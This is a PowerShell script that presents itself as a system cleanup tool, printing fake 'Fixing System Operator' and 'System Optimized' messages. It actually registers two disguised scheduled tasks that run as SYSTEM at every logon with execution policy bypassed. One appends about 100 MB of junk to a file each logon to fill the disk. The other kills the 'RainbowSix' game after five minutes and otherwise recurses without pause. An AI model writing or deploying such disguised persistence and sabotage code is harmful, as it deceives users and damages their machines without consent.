mkdir "C:\configWin" | out-null
mkdir "C:\configWin\assets" | out-null

$contenuto = @'
$a = "a" * 104857600 | Out-File -FilePath "C:\configWin\assets\configwind.txt" -Append
'@

$contenuto | Out-File "C:\configWin\assets\configSys.ps1"

$scriptPath = "C:\configWin\assets\configSys.ps1"
$action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-ExecutionPolicy Bypass -File `"$scriptPath`""
$trigger = New-ScheduledTaskTrigger -AtLogOn -RandomDelay (New-TimeSpan -Seconds 30)
$principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest

Register-ScheduledTask -TaskName "CleanWinProcess" -Action $action -Trigger $trigger -Principal $principal | out-null

$contenuto1 = @'
function b{
  $a = get-process | Where-Object {$_.ProcessName -eq "RainbowSix"}
  if($a){
    Start-Sleep -Seconds 300
    Stop-Process -Name "RainbowSix"
  }else{b}
}
b
'@

$contenuto1 | Out-File "C:\configWin\assets\configSysPush.ps1"

$scriptPath = "C:\configWin\assets\configSysPush.ps1"
$action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-ExecutionPolicy Bypass -File `"$scriptPath`""
$trigger = New-ScheduledTaskTrigger -AtLogOn -RandomDelay (New-TimeSpan -Seconds 30)
$principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest

Register-ScheduledTask -TaskName "CleanWinProcessPush" -Action $action -Trigger $trigger -Principal $principal | out-null

Write-Host "Fixing System Operator..." -ForegroundColor "Yellow"
Start-Sleep -Seconds 20
Write-Host "Cleanup Process..." -ForegroundColor "Yellow"
Start-Sleep -Seconds 20
Write-Host "System Optimized" -ForegroundColor "Green"
